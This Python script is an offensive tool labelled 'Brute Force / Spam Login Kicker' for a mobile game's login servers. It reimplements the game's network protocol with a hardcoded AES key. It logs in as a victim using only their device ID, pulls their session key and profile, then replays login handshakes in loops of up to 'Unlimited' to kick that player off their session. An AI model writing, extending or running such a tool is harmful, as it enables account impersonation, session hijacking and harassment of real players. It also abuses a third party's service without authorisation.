#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - BRUTE FORCE / SPAM LOGIN KICKER v8.0
# Created by: @acepoge
# Only: Brute Force / Spam Login Kicker
# Android-adapted: writable output dir, no Telegram.
# ===================================================================

import os, sys, time, json, socket, zlib, struct, threading
from enum import Enum
from typing import Tuple, Dict, Any, Optional
from Crypto.Cipher import AES
from colorama import init, Fore, Style
from datetime import datetime, timezone, timedelta
import zstandard as zstd

init(autoreset=True)


# ======================================================================
# Android-aware output routing
# ======================================================================
def _is_android():
    return ('ANDROID_ARGUMENT' in os.environ
            or 'ANDROID_PRIVATE' in os.environ
            or hasattr(sys, 'getandroidapilevel'))


def _writable_root():
    if _is_android():
        for key in ('ANDROID_PRIVATE', 'ANDROID_APP_PATH'):
            p = os.environ.get(key)
            if p and os.path.isdir(p):
                return p
        home = os.path.expanduser('~')
        if home and os.path.isdir(home):
            return home
    return os.path.dirname(os.path.abspath(__file__))


# ────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────
TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR = _writable_root()
OUTPUT_DIR = os.path.join(BASE_DIR, "PREMIUM_DEVID_SEKER_OUTPUT")
BF_FOLDER = "22_BruteForce_Logs"

AES_KEY     = bytes.fromhex('2dd646797ec5a7ae563a37ce5e6d8576')
AES_IV      = b'\x00' * 16
SERVER_HOST = 'login.ml.youngjoygame.com'
SERVER_PORT = 30021

CLIENT_VERSION = '2.2.16.1232.1'
CHANNEL = 'and_usa'
LANGUAGE = 'en'


def ensure_dirs():
    os.makedirs(os.path.join(OUTPUT_DIR, BF_FOLDER), exist_ok=True)

ensure_dirs()

BRUTE_LOG = os.path.join(OUTPUT_DIR, BF_FOLDER, "bruteforce_session.txt")


# ────────────────────────────────────────────────────────────────
# RANK
# ────────────────────────────────────────────────────────────────
def map_rank(p) -> str:
    if not p or not isinstance(p, (int, float)) or p <= 0: return "Unranked"
    p = int(p)
    if p >= 136:
        s = p - 136
        if s >= 100: return f"Mythical Immortal ({s}★)"
        if s >= 50: return f"Mythical Glory ({s}★)"
        if s >= 25: return f"Mythical Honor ({s}★)"
        return f"Mythic ({s}★)"
    ranks = [(105,"Legend",5,["V","IV","III","II","I"]),
             (75,"Epic",5,["V","IV","III","II","I"]),
             (45,"Grandmaster",5,["V","IV","III","II","I"]),
             (25,"Master",4,["IV","III","II","I"]),
             (10,"Elite",3,["IV","III","II","I"]),
             (1,"Warrior",3,["III","II","I"])]
    for th, name, ds, dn in ranks:
        if p >= th:
            off = p - th
            di = min(len(dn)-1, off // ds)
            st = (off % ds) + 1
            return f"{name} {dn[di]} ({st}★)"
    return "Warrior III (1★)"


# ────────────────────────────────────────────────────────────────
# SDP PROTOCOL
# ────────────────────────────────────────────────────────────────
class SdpDataType(Enum):
    INTEGER_POSITIVE=0; INTEGER_NEGATIVE=1; FLOAT=2; DOUBLE=3
    STRING=4; LIST=5; DICT=6; STRUCT_BEGIN=7; STRUCT_END=8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''; self.offset = 0
        if isinstance(data, bytes):
            self.data = data; self._unpack()
        elif data is not None:
            self.update(data); self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()): self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value: self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
            self[k] = v

    def _write_varint(self, n):
        r = bytearray()
        while n >= 0x80: r.append((n & 0x7F) | 0x80); n >>= 7
        r.append(n & 0x7F); return bytes(r)

    def _read_varint(self):
        n = 1; val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n); n += 1
        self.offset += n; return val

    def _pack_header(self, t, d):
        if t < 15: self.data += bytes([(d.value << 4) | t])
        else: self.data += bytes([(d.value << 4) | 15]) + self._write_varint(t)

    def _pack_item(self, t, v):
        if isinstance(v, bool):
            self._pack_header(t, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if v else 0)
        elif isinstance(v, int):
            if v < 0: self._pack_header(t, SdpDataType.INTEGER_NEGATIVE); self.data += self._write_varint(-v)
            else: self._pack_header(t, SdpDataType.INTEGER_POSITIVE); self.data += self._write_varint(v)
        elif isinstance(v, float):
            self._pack_header(t, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", v)
        elif isinstance(v, (str, bytes)):
            self._pack_header(t, SdpDataType.STRING)
            e = v.encode('utf-8') if isinstance(v, str) else v
            self.data += self._write_varint(len(e)) + e
        elif isinstance(v, list):
            self._pack_header(t, SdpDataType.LIST)
            self.data += self._write_varint(len(v))
            for i in v: self._pack_item(0, i)
        elif isinstance(v, dict):
            if isinstance(v, SdpStruct):
                self._pack_header(t, SdpDataType.STRUCT_BEGIN)
                for k, x in sorted(v.items()): self._pack_item(k, x)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(t, SdpDataType.DICT)
                self.data += self._write_varint(len(v))
                for k, x in sorted(v.items()):
                    self._pack_item(0, k); self._pack_item(0, x)

    def _unpack_item(self):
        if self.offset >= len(self.data): return 0, None
        h = self.data[self.offset]; t = h & 0xF; d = SdpDataType(h >> 4)
        self.offset += 1
        if t == 15: t = self._read_varint()
        if d == SdpDataType.INTEGER_POSITIVE: return t, self._read_varint()
        if d == SdpDataType.INTEGER_NEGATIVE: return t, -self._read_varint()
        if d == SdpDataType.DOUBLE: return t, struct.unpack("<d", self._read_varint().to_bytes(8,'little'))[0]
        if d == SdpDataType.STRING:
            l = self._read_varint(); r = self.data[self.offset:self.offset+l]; self.offset += l
            try: return t, r.decode('utf-8')
            except: return t, r
        if d == SdpDataType.LIST:
            l = self._read_varint(); return t, [self._unpack_item()[1] for _ in range(l)]
        if d == SdpDataType.DICT:
            l = self._read_varint(); res = {}
            for _ in range(l):
                _, k = self._unpack_item(); _, v = self._unpack_item(); res[k] = v
            return t, res
        if d == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return t, SdpStruct(res)
        if d == SdpDataType.STRUCT_END: return t, SdpDataType.STRUCT_END
        return t, None

# ────────────────────────────────────────────────────────────────
# CONNECTION
# ────────────────────────────────────────────────────────────────
class BaseConn:
    def __init__(self, host, port):
        self.host = host; self.port = port; self.seq = 1
        self.sock = None; self.q = b''
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port)); self.sock.settimeout(5)
    def cleanup(self):
        if self.sock:
            try: self.sock.close()
            except: pass
            self.seq = 1; self.sock = None
    def __enter__(self): self.connect(); return self
    def __exit__(self, *a): self.cleanup()
    def send_data(self, pid, sdp):
        pkt = SdpStruct({0:pid, 1:self.seq, 5:sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp)+4) | (16<<24)
        self.sock.send(flags.to_bytes(4,'big') + comp); self.seq += 1
    def recv_data(self):
        try:
            while len(self.q) < 4:
                d = self.sock.recv(4096)
                if not d: return None, None
                self.q += d
            flags = int.from_bytes(self.q[:4],'big')
            sz = flags & 0xFFFFFF; ct = flags >> 24
            while len(self.q) < sz:
                d = self.sock.recv(4096)
                if not d: return None, None
                self.q += d
            data = self.q[4:sz]; self.q = self.q[sz:]
            if ct == 1: data = zlib.decompress(data)
            elif ct == 16: data = zstd.decompress(data)
            elif ct in (2,3,18):
                c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = c.decrypt(data[:-1] if len(data)%16 else data).rstrip(b'\x00')
                if ct == 3: data = zlib.decompress(data)
                elif ct == 18: data = zstd.decompress(data)
            r = SdpStruct(data); pid = r.get(0)
            if pid is None: return None, None
            body = r.get(6) or r.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None

class GameLogin(BaseConn):
    def __init__(self, dev):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.dev = dev
        raw = dev.strip()
        if raw.startswith(("and_","ios_")): raw = raw[4:]
        self.imei = raw[:32] if len(raw)>=32 else raw
        self.android = raw[32:48] if len(raw)>=48 else ""
        self.adid = raw[48:] if len(raw)>48 else ""
    def run(self):
        try:
            self.connect()
            self.send_data(1, SdpStruct({0:self.dev,1:f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',2:CLIENT_VERSION,3:CHANNEL,4:LANGUAGE}))
            pid, res = self.recv_data()
            if pid == 2 and res: return res.get(0), (res[2][0] if 2 in res else None), "NORMAL"
            return None, None, f"FAIL({pid})"
        except Exception as e: return None, None, f"ERR({e})"
        finally: self.cleanup()

class GameConn(BaseConn):
    def __init__(self, dev):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.dev = dev; raw = dev.strip()
        if raw.startswith(("and_","ios_")): raw = raw[4:]
        self.imei = raw[:32] if len(raw)>=32 else raw
        self.android = raw[32:48] if len(raw)>=48 else ""
        self.adid = raw[48:] if len(raw)>48 else ""
        self.acc=0; self.skey=''; self.zone=0; self.ghost=''; self.gport=0; self.cts=0; self.ban="NORMAL"
    def login_srv(self):
        if not self.sock or self.host != SERVER_HOST:
            self.cleanup(); self.host, self.port = SERVER_HOST, SERVER_PORT; self.connect()
        self.send_data(1, SdpStruct({0:self.dev,1:f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',2:CLIENT_VERSION,3:CHANNEL,4:'en'}))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.acc = res.get(0); self.skey = res[1]; self.zone = res[2][0]; self.cts = res.get(19,0); self.ban = "NORMAL"
            return True
        self.ban = "LOGIN FAILED"
        return False
    def get_gs(self):
        self.send_data(5, SdpStruct({0:self.acc,1:self.skey,2:CLIENT_VERSION,5:self.zone,6:CHANNEL}))
        pid, res = self.recv_data()
        if pid == 6 and res:
            h, p = res[1].split(':'); self.ghost = h; self.gport = int(p); return True
        return False
    def conn_gs(self):
        self.cleanup(); self.host, self.port = self.ghost, self.gport; self.connect()
        self.send_data(10001, SdpStruct({0:self.acc,1:self.skey,2:self.zone,4:CLIENT_VERSION,13:CHANNEL,15:self.dev}))
        for _ in range(5):
            pid, res = self.recv_data()
            if pid == 10002: return True
            if pid in (-1,None): break
        return False
    def check_ban(self):
        self.send_data(10101, SdpStruct({0:0,2:2}))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                b = res[0]
                self.ban = f"BANNED (Reason: {b.get('ban_reason','Unknown')} | {b.get('endtime_day','0')}d {b.get('endtime_hour','0')}h)"
                return self.ban
            if pid in (-1,None,20002): break
        return self.ban
    def skin_info(self, r, z):
        self.send_data(10143, SdpStruct({0:int(r),1:int(z)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1,None): break
            if pid == 10144: return res
        return None

# ────────────────────────────────────────────────────────────────
# FETCH SESSION PROFILE
# ────────────────────────────────────────────────────────────────
def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
    acc, zone, stat = GameLogin(device_id).run()
    if not acc or not zone:
        return None
    try:
        conn = GameConn(device_id)
        if not conn.login_srv(): return None
        if not conn.get_gs() or not conn.conn_gs(): return None

        sess_key = conn.skey
        gs_host = conn.ghost
        gs_port = conn.gport
        creation_ts = conn.cts

        skin_info = conn.skin_info(acc, zone)
        ban_stat = conn.check_ban()
        conn.cleanup()

        skin_info = skin_info if isinstance(skin_info, dict) else {}
        nick = skin_info.get(2) or f"Player_{acc}"
        level = skin_info.get(3) or 1
        skin_cnt = skin_info.get(10) if (skin_info and skin_info.get(10) is not None) else 0
        hero_cnt = skin_info.get(9) if (skin_info and skin_info.get(9) is not None) else 0
        cur_rank_val = skin_info.get(6, 0) or 0
        max_rank_val = skin_info.get(15, 0) or cur_rank_val

        return {
            'device_id': device_id, 'account_id': acc,
            'session_key': sess_key, 'zone_id': zone,
            'creation_ts': creation_ts,
            'game_host': gs_host, 'game_port': gs_port,
            'gs_info': f"{gs_host}:{gs_port}",
            'nickname': nick, 'level': level,
            'rank': map_rank(cur_rank_val),
            'highest_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
            'skin_count': skin_cnt, 'hero_count': hero_cnt,
            'ban_status': ban_stat,
        }
    except:
        return None

# ────────────────────────────────────────────────────────────────
# SESSION KICK
# ────────────────────────────────────────────────────────────────
def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
    t0 = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))

        body_struct = SdpStruct({
            0: profile['account_id'], 1: profile['session_key'],
            2: profile['zone_id'], 4: CLIENT_VERSION,
            13: CHANNEL, 15: profile['device_id']
        }).data

        pkt = SdpStruct({0: 10001, 1: 1, 5: body_struct}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, 'big') + comp)

        q = b''
        got_ack = False
        while len(q) < 4:
            d = sock.recv(4096)
            if not d: break
            q += d
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], 'big')
            sz = fl & 0xFFFFFF
            while len(q) < sz:
                d = sock.recv(4096)
                if not d: break
                q += d
            if len(q) >= sz: got_ack = True

        elapsed_ms = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed_ms, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, "TIMEOUT"
    except Exception as e:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, str(e)

# ────────────────────────────────────────────────────────────────
# UI HELPERS
# ────────────────────────────────────────────────────────────────
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(f"""{Fore.CYAN}
  ╭──────────────────────────────────────────────────────────╮
  │  {Fore.MAGENTA}⚡ BRUTE FORCE / SPAM LOGIN KICKER{Fore.CYAN}  •  {Fore.YELLOW}v8.0{Fore.CYAN}        │
  │  {Fore.LIGHTBLACK_EX}Created by: {Fore.GREEN}@Brujek_l{Fore.CYAN}                                  │
  ╰──────────────────────────────────────────────────────────╯{Style.RESET_ALL}
""")

def section(title):
    print(f"\n{Fore.CYAN}┌─ {Fore.YELLOW}{title} {Fore.CYAN}{'─' * (50 - len(title))}┐{Style.RESET_ALL}")

def end_section():
    print(f"{Fore.CYAN}└{'─' * 54}┘{Style.RESET_ALL}\n")

def print_profile_card(data: Dict[str, Any]):
    section("Target Profile")
    print(f"  {Fore.CYAN}🆔 Account ID{Style.RESET_ALL}    : {Fore.YELLOW}{data['account_id']}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}🌐 Zone ID{Style.RESET_ALL}       : {Fore.YELLOW}{data['zone_id']}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}👤 Nickname{Style.RESET_ALL}      : {Fore.GREEN}{data['nickname']}{Style.RESET_ALL}  (Lv.{data['level']})")
    print(f"  {Fore.CYAN}🏆 Current Rank{Style.RESET_ALL}  : {Fore.MAGENTA}{data['rank']}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}⭐ Highest Rank{Style.RESET_ALL}  : {Fore.YELLOW}{data['highest_rank']}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}🎨 Skin / Hero{Style.RESET_ALL}   : {Fore.YELLOW}{data['skin_count']} Skin{Style.RESET_ALL} | {Fore.YELLOW}{data['hero_count']} Hero{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}🌐 Game Server{Style.RESET_ALL}   : {Fore.CYAN}{data['gs_info']}{Style.RESET_ALL}")
    bc = Fore.RED if 'ban' in str(data['ban_status']).lower() else Fore.GREEN
    print(f"  {Fore.CYAN}⚡ Status{Style.RESET_ALL}        : {bc}{data['ban_status']}{Style.RESET_ALL}")
    end_section()

# ────────────────────────────────────────────────────────────────
# MAIN LOOP
# ────────────────────────────────────────────────────────────────
def run_bruteforce_login():
    while True:
        print_banner()
        section("Target Device")
        target_device = input(f"  {Fore.CYAN}▸ Device ID (0 = Exit): {Style.RESET_ALL}").strip()
        end_section()

        if not target_device or target_device in ('0', 'q', 'exit', 'back'):
            print(f"\n  {Fore.GREEN}✓ Goodbye · @Brujek_l{Style.RESET_ALL}\n")
            return

        print(f"  {Fore.YELLOW}⏳ Verifying target & fetching session info...{Style.RESET_ALL}")
        profile = fetch_session_profile(target_device)

        if not profile:
            print(f"\n  {Fore.RED}❌ Invalid Device ID, dead, or login failed!{Style.RESET_ALL}")
            input(f"\n  {Fore.YELLOW}Press Enter...{Style.RESET_ALL}")
            continue

        print_profile_card(profile)

        section("Kick Mode")
        print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} 🧪 Single Test (One Kick)  {Fore.GREEN}[Enter]{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} ⚡ 10x  Standard")
        print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL} 🚀 50x  Fast")
        print(f"  {Fore.YELLOW}[4]{Style.RESET_ALL} 💥 100x Aggressive")
        print(f"  {Fore.YELLOW}[5]{Style.RESET_ALL} ♾️  Unlimited (Ctrl+C to stop)")
        print(f"  {Fore.YELLOW}[6]{Style.RESET_ALL} 🛠️  Custom (loop count + delay)")
        print(f"  {Fore.YELLOW}[0]{Style.RESET_ALL} 🔙 Back")
        end_section()

        mode_ch = input(f"  {Fore.CYAN}▸ Choose (0-6, Enter=1): {Style.RESET_ALL}").strip()
        if mode_ch == '0': continue

        if mode_ch in ('', '1'):
            print(f"\n  {Fore.CYAN}[*] Sending session handshake to {profile['gs_info']}...{Style.RESET_ALL}")
            success, latency_ms, status_desc = send_session_kick(profile)
            if success:
                print(f"\n  {Fore.GREEN}✅ SUCCESS — Session connected & kicked!{Style.RESET_ALL}")
                print(f"    ├─ Status  : {Fore.YELLOW}{status_desc}{Style.RESET_ALL}")
                print(f"    ├─ Latency : {Fore.YELLOW}{latency_ms:.1f} ms{Style.RESET_ALL}")
                print(f"    └─ Server  : {Fore.CYAN}{profile['gs_info']}{Style.RESET_ALL}")
            else:
                print(f"\n  {Fore.RED}❌ FAILED — {status_desc} ({latency_ms:.1f} ms){Style.RESET_ALL}")
            input(f"\n  {Fore.YELLOW}Press Enter...{Style.RESET_ALL}")
            continue

        total_loops = 10
        delay_sec = 2.0
        if mode_ch == '2': total_loops, delay_sec = 10, 2.0
        elif mode_ch == '3': total_loops, delay_sec = 50, 1.0
        elif mode_ch == '4': total_loops, delay_sec = 100, 0.5
        elif mode_ch == '5': total_loops, delay_sec = 0, 0.0
        elif mode_ch == '6':
            try:
                total_loops = int(input(f"  {Fore.CYAN}▸ Loops (0=unlimited, default=10): {Style.RESET_ALL}").strip() or "10")
                delay_sec = float(input(f"  {Fore.CYAN}▸ Delay seconds (default=2.0): {Style.RESET_ALL}").strip() or "2.0")
            except:
                total_loops, delay_sec = 10, 2.0

        loop_label = f"{total_loops:,} Loops" if total_loops > 0 else "Unlimited"
        print(f"\n  {Fore.YELLOW}⚡ SPAM KICK ACTIVE ({loop_label} | Delay {delay_sec}s){Style.RESET_ALL}\n")

        count = 0; success_count = 0; fail_count = 0
        latencies = []
        start_time = time.time()

        with open(BRUTE_LOG, "a", encoding='utf-8') as log:
            log.write(f"\n{'═'*60}\n")
            log.write(f"SESSION: {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}\n")
            log.write(f"Target: {profile['nickname']} (ID: {profile['account_id']}, Zone: {profile['zone_id']})\n")
            log.write(f"Total Loops: {loop_label} | Delay: {delay_sec}s\n")
            log.write(f"{'═'*60}\n")

        try:
            while True:
                count += 1
                ok, lat, desc = send_session_kick(profile)
                latencies.append(lat)
                cur_time = datetime.now(TZ_WIB).strftime('%H:%M:%S')
                loop_str = f"{count}/{total_loops}" if total_loops > 0 else f"{count}/inf"
                if ok:
                    success_count += 1
                    status_msg = f"{Fore.GREEN}[OK]{Style.RESET_ALL}"
                else:
                    fail_count += 1
                    status_msg = f"{Fore.RED}[X]{Style.RESET_ALL}"
                sys.stdout.write(f"\r  [{cur_time}] {status_msg} Loop {Fore.YELLOW}{loop_str}{Style.RESET_ALL} | Lat: {Fore.CYAN}{lat:.0f}ms{Style.RESET_ALL} | OK: {Fore.GREEN}{success_count}{Style.RESET_ALL} | Fail: {Fore.RED}{fail_count}{Style.RESET_ALL}   ")
                sys.stdout.flush()
                if count % 10 == 0:
                    with open(BRUTE_LOG, "a", encoding='utf-8') as log:
                        log.write(f"[{cur_time}] Loop {count}: OK={success_count}, Fail={fail_count}, Last Lat={lat:.0f}ms\n")
                if total_loops > 0 and count >= total_loops:
                    break
                if delay_sec > 0:
                    time.sleep(delay_sec)
        except KeyboardInterrupt:
            print(f"\n\n  {Fore.YELLOW}⚠️  Stopped by user.{Style.RESET_ALL}")

        duration = time.time() - start_time
        avg_lat = (sum(latencies) / len(latencies)) if latencies else 0.0
        succ_pct = (success_count / count * 100) if count > 0 else 0.0
        speed = (count / duration) if duration > 0 else 0.0

        section("Session Summary")
        print(f"  {Fore.CYAN}👤 Target{Style.RESET_ALL}      : {Fore.YELLOW}{profile['nickname']}{Style.RESET_ALL} ({profile['account_id']})")
        print(f"  {Fore.CYAN}⏱️  Duration{Style.RESET_ALL}    : {Fore.WHITE}{duration:.1f}s{Style.RESET_ALL} ({duration/60:.1f} min)")
        print(f"  {Fore.CYAN}🔄 Attempts{Style.RESET_ALL}    : {Fore.CYAN}{count:,}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}✅ Success{Style.RESET_ALL}     : {Fore.GREEN}{success_count:,}{Style.RESET_ALL} ({succ_pct:.1f}%)")
        print(f"  {Fore.CYAN}❌ Failed{Style.RESET_ALL}      : {Fore.RED}{fail_count:,}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}⚡ Avg Lat{Style.RESET_ALL}     : {Fore.YELLOW}{avg_lat:.1f} ms{Style.RESET_ALL} | Speed: {Fore.YELLOW}{speed:.2f}/s{Style.RESET_ALL}")
        end_section()

        with open(BRUTE_LOG, "a", encoding='utf-8') as log:
            log.write(f"SUMMARY: Duration={duration:.1f}s, Attempts={count}, OK={success_count}, Fail={fail_count}, AvgLat={avg_lat:.1f}ms\n")

        input(f"  {Fore.YELLOW}Press Enter...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# ENTRY
# ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    try:
        run_bruteforce_login()
    except KeyboardInterrupt:
        print(f"\n\n  {Fore.YELLOW}Stopped by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n  {Fore.RED}Error: {e}{Style.RESET_ALL}")
        import traceback; traceback.print_exc()
